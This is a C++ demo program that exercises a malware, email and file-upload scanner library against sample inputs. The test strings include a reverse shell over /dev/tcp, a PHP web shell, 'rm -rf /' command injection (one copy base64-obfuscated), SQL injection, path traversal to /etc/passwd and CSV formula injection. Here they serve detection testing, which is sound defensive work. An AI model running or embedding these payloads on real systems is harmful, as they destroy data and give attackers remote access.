#include "security/malware_scanner.h"
#include <iostream>
#include <iomanip>
#include <fstream>

using namespace security::scanner;

void print_separator() {
    std::cout << std::string(80, '=') << "\n";
}

void print_scan_result(const ScanResult& result) {
    std::cout << "\n" << result.to_string() << "\n";
}

void demo_basic_scanning() {
    print_separator();
    std::cout << "DEMO 1: Basic Content Scanning\n";
    print_separator();
    
    MalwareScanner scanner;
    
    // Safe content
    std::cout << "\n[Test 1] Scanning safe content...\n";
    std::string safe_text = "Hello, this is a normal message with no threats.";
    auto result1 = scanner.scan_text(safe_text);
    print_scan_result(result1);
    
    // Malicious code
    std::cout << "\n[Test 2] Scanning content with shell commands...\n";
    std::string malicious1 = "User input: '; system('rm -rf /'); echo 'done'";
    auto result2 = scanner.scan_text(malicious1);
    print_scan_result(result2);
    
    // SQL Injection
    std::cout << "\n[Test 3] Scanning content with SQL injection...\n";
    std::string malicious2 = "SELECT * FROM users WHERE id=1' OR '1'='1; DROP TABLE users;--";
    auto result3 = scanner.scan_text(malicious2);
    print_scan_result(result3);
    
    // Path traversal
    std::cout << "\n[Test 4] Scanning content with path traversal...\n";
    std::string malicious3 = "filename: ../../../../etc/passwd";
    auto result4 = scanner.scan_text(malicious3);
    print_scan_result(result4);
    
    std::cout << "\nScanner Statistics:\n";
    std::cout << "  Total scans: " << scanner.get_total_scans() << "\n";
    std::cout << "  Threats detected: " << scanner.get_threats_detected() << "\n";
}

void demo_email_scanning() {
    print_separator();
    std::cout << "DEMO 2: Email Security Scanning\n";
    print_separator();
    
    EmailSecurityScanner email_scanner;
    
    // Safe email
    std::cout << "\n[Test 1] Scanning legitimate email...\n";
    {
        std::string subject = "Meeting tomorrow at 10am";
        std::string from = "colleague@company.com";
        std::string body = "Hi, let's meet tomorrow to discuss the project.";
        std::vector<std::pair<std::string, std::vector<char>>> attachments;
        
        auto result = email_scanner.scan_email(subject, from, body, attachments);
        std::cout << "  Safe: " << (result.is_safe ? "YES" : "NO") << "\n";
        std::cout << "  Phishing: " << (result.has_phishing_indicators ? "YES" : "NO") << "\n";
        std::cout << "  Spam: " << (result.has_spam_indicators ? "YES" : "NO") << "\n";
        std::cout << "  Suspicious Links: " << (result.has_suspicious_links ? "YES" : "NO") << "\n";
    }
    
    // Phishing email
    std::cout << "\n[Test 2] Scanning phishing email...\n";
    {
        std::string subject = "URGENT: Verify your account immediately!";
        std::string from = "security@paypa1.com";
        std::string body = "Your account has been suspended. Click here to verify your identity immediately: http://192.168.1.1/verify.php";
        std::vector<std::pair<std::string, std::vector<char>>> attachments;
        
        auto result = email_scanner.scan_email(subject, from, body, attachments);
        std::cout << "  Safe: " << (result.is_safe ? "YES" : "NO") << "\n";
        std::cout << "  Phishing: " << (result.has_phishing_indicators ? "YES" : "NO") << "\n";
        std::cout << "  Spam: " << (result.has_spam_indicators ? "YES" : "NO") << "\n";
        std::cout << "  Suspicious Links: " << (result.has_suspicious_links ? "YES" : "NO") << "\n";
        
        if (!result.warnings.empty()) {
            std::cout << "  Warnings:\n";
            for (const auto& warning : result.warnings) {
                std::cout << "    - " << warning << "\n";
            }
        }
    }
    
    // Email with malicious attachment
    std::cout << "\n[Test 3] Scanning email with malicious attachment...\n";
    {
        std::string subject = "Invoice for your order";
        std::string from = "billing@company.com";
        std::string body = "Please find attached invoice.";
        
        // Create fake malicious attachment
        std::string malicious_content = "<?php system($_GET['cmd']); ?>";
        std::vector<char> attachment_data(malicious_content.begin(), malicious_content.end());
        
        std::vector<std::pair<std::string, std::vector<char>>> attachments = {
            {"invoice.php", attachment_data}
        };
        
        auto result = email_scanner.scan_email(subject, from, body, attachments);
        std::cout << "  Safe: " << (result.is_safe ? "YES" : "NO") << "\n";
        std::cout << "  Attachments scanned: " << result.attachment_scans.size() << "\n";
        
        for (size_t i = 0; i < result.attachment_scans.size(); i++) {
            std::cout << "  Attachment " << (i+1) << " threats: " << result.attachment_scans[i].threats_found.size() << "\n";
            for (const auto& threat : result.attachment_scans[i].threats_found) {
                std::cout << "    - " << threat << "\n";
            }
        }
    }
}

void demo_file_upload_scanning() {
    print_separator();
    std::cout << "DEMO 3: File Upload Security Scanning\n";
    print_separator();
    
    FileUploadScanner upload_scanner;
    
    // Safe upload
    std::cout << "\n[Test 1] Scanning safe text file upload...\n";
    {
        std::string filename = "report.txt";
        std::string content = "This is a simple text report with safe content.";
        std::vector<char> data(content.begin(), content.end());
        
        auto result = upload_scanner.scan_upload(filename, data);
        std::cout << "  Allowed: " << (result.allowed ? "YES" : "NO") << "\n";
        std::cout << "  Sanitized filename: " << result.sanitized_filename << "\n";
        std::cout << "  Needs sanitization: " << (result.needs_sanitization ? "YES" : "NO") << "\n";
        if (!result.allowed) {
            std::cout << "  Rejection reason: " << result.rejection_reason << "\n";
        }
    }
    
    // Path traversal attempt
    std::cout << "\n[Test 2] Scanning file with path traversal...\n";
    {
        std::string filename = "../../etc/passwd.txt";
        std::string content = "malicious content";
        std::vector<char> data(content.begin(), content.end());
        
        auto result = upload_scanner.scan_upload(filename, data);
        std::cout << "  Allowed: " << (result.allowed ? "YES" : "NO") << "\n";
        if (!result.allowed) {
            std::cout << "  Rejection reason: " << result.rejection_reason << "\n";
        }
    }
    
    // Disallowed extension
    std::cout << "\n[Test 3] Scanning file with disallowed extension...\n";
    {
        std::string filename = "malware.exe";
        std::string content = "MZ\x90\x00";  // PE header
        std::vector<char> data(content.begin(), content.end());
        
        auto result = upload_scanner.scan_upload(filename, data);
        std::cout << "  Allowed: " << (result.allowed ? "YES" : "NO") << "\n";
        if (!result.allowed) {
            std::cout << "  Rejection reason: " << result.rejection_reason << "\n";
        }
    }
    
    // Malicious content in allowed file type
    std::cout << "\n[Test 4] Scanning CSV with malicious content...\n";
    {
        std::string filename = "data.csv";
        std::string content = "name,value\ntest,=system('calc')\njohn,123";
        std::vector<char> data(content.begin(), content.end());
        
        auto result = upload_scanner.scan_upload(filename, data);
        std::cout << "  Allowed: " << (result.allowed ? "YES" : "NO") << "\n";
        std::cout << "  Threats found: " << result.scan_result.threats_found.size() << "\n";
        for (const auto& threat : result.scan_result.threats_found) {
            std::cout << "    - " << threat << "\n";
        }
        if (!result.allowed) {
            std::cout << "  Rejection reason: " << result.rejection_reason << "\n";
        }
    }
    
    // Filename sanitization
    std::cout << "\n[Test 5] Scanning file with special characters...\n";
    {
        std::string filename = "my file <test> [2024].txt";
        std::string content = "Safe content";
        std::vector<char> data(content.begin(), content.end());
        
        auto result = upload_scanner.scan_upload(filename, data);
        std::cout << "  Original filename: " << filename << "\n";
        std::cout << "  Sanitized filename: " << result.sanitized_filename << "\n";
        std::cout << "  Needs sanitization: " << (result.needs_sanitization ? "YES" : "NO") << "\n";
        std::cout << "  Allowed: " << (result.allowed ? "YES" : "NO") << "\n";
    }
}

void demo_advanced_threats() {
    print_separator();
    std::cout << "DEMO 4: Advanced Threat Detection\n";
    print_separator();
    
    MalwareScanner scanner;
    
    // Base64 obfuscation
    std::cout << "\n[Test 1] Detecting base64 obfuscation...\n";
    {
        std::string content = "eval(base64_decode('c3lzdGVtKCdybSAtcmYgLycp'))";
        auto result = scanner.scan_text(content);
        print_scan_result(result);
    }
    
    // Ransomware indicators
    std::cout << "\n[Test 2] Detecting ransomware patterns...\n";
    {
        std::string content = R"(
            function encrypt_files() {
                var files = get_all_files();
                for (file in files) {
                    AES.Encrypt(file, key);
                    rename(file, file + '.encrypted');
                }
                show_ransom_message();
            }
        )";
        auto result = scanner.scan_text(content);
        print_scan_result(result);
    }
    
    // Reverse shell
    std::cout << "\n[Test 3] Detecting backdoor/reverse shell...\n";
    {
        std::string content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        auto result = scanner.scan_text(content);
        print_scan_result(result);
    }
    
    // High entropy (encrypted/packed)
    std::cout << "\n[Test 4] Detecting high entropy content...\n";
    {
        // Generate random-looking data
        std::string content;
        for (int i = 0; i < 1000; i++) {
            content += static_cast<char>(rand() % 256);
        }
        auto result = scanner.scan_text(content);
        std::cout << "  Threat level: " << threat_level_to_string(result.threat_level) << "\n";
        std::cout << "  Threats detected: " << result.threats_found.size() << "\n";
        for (const auto& threat : result.threats_found) {
            std::cout << "    - " << threat << "\n";
        }
    }
}

void demo_performance() {
    print_separator();
    std::cout << "DEMO 5: Scanner Performance\n";
    print_separator();
    
    MalwareScanner scanner;
    
    std::vector<size_t> test_sizes = {1024, 10*1024, 100*1024, 1024*1024};
    
    for (size_t size : test_sizes) {
        std::string content(size, 'A');
        auto start = std::chrono::high_resolution_clock::now();
        auto result = scanner.scan_text(content);
        auto end = std::chrono::high_resolution_clock::now();
        
        double duration = std::chrono::duration<double, std::milli>(end - start).count();
        
        std::cout << "\n  Content size: " << std::setw(10) << size << " bytes\n";
        std::cout << "  Scan time:    " << std::fixed << std::setprecision(2) << std::setw(10) << duration << " ms\n";
        std::cout << "  Throughput:   " << std::fixed << std::setprecision(2) 
                  << (size / 1024.0 / 1024.0) / (duration / 1000.0) << " MB/s\n";
    }
}

void demo_custom_signatures() {
    print_separator();
    std::cout << "DEMO 6: Custom Malware Signatures\n";
    print_separator();
    
    MalwareScanner scanner;
    
    std::cout << "\nDefault signatures loaded: " << scanner.get_signature_count() << "\n";
    
    // Add custom signature
    MalwareSignature custom_sig;
    custom_sig.name = "Custom.Backdoor.MyApp";
    custom_sig.description = "Custom backdoor pattern for MyApp";
    custom_sig.patterns = {"SECRET_BACKDOOR", "HIDDEN_ACCESS"};
    custom_sig.severity = ThreatLevel::CRITICAL;
    custom_sig.category = "custom_backdoor";
    
    scanner.add_signature(custom_sig);
    
    std::cout << "After adding custom signature: " << scanner.get_signature_count() << "\n";
    
    // Test custom signature
    std::cout << "\n[Test] Scanning for custom signature...\n";
    std::string content = "This application has a SECRET_BACKDOOR for remote access";
    auto result = scanner.scan_text(content);
    print_scan_result(result);
}

int main() {
    std::cout << "\n";
    print_separator();
    std::cout << "       MALWARE SCANNER & SECURITY SUITE DEMO\n";
    print_separator();
    std::cout << "\n";
    std::cout << "This demo showcases the comprehensive security scanning capabilities\n";
    std::cout << "for detecting and preventing malicious code in various contexts.\n\n";
    
    try {
        demo_basic_scanning();
        std::cout << "\n\n";
        
        demo_email_scanning();
        std::cout << "\n\n";
        
        demo_file_upload_scanning();
        std::cout << "\n\n";
        
        demo_advanced_threats();
        std::cout << "\n\n";
        
        demo_performance();
        std::cout << "\n\n";
        
        demo_custom_signatures();
        std::cout << "\n\n";
        
        print_separator();
        std::cout << "All demos completed successfully!\n";
        print_separator();
        std::cout << "\n";
        
        std::cout << "Key Features Demonstrated:\n";
        std::cout << "  ✓ Signature-based malware detection\n";
        std::cout << "  ✓ Heuristic analysis (entropy, patterns)\n";
        std::cout << "  ✓ Email security scanning (phishing, spam, attachments)\n";
        std::cout << "  ✓ File upload validation and sanitization\n";
        std::cout << "  ✓ Path traversal prevention\n";
        std::cout << "  ✓ SQL injection detection\n";
        std::cout << "  ✓ Shell command injection detection\n";
        std::cout << "  ✓ Ransomware pattern detection\n";
        std::cout << "  ✓ Backdoor/reverse shell detection\n";
        std::cout << "  ✓ Base64 obfuscation detection\n";
        std::cout << "  ✓ Custom signature support\n";
        std::cout << "  ✓ Performance optimization\n";
        std::cout << "\n";
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }
    
    return 0;
}
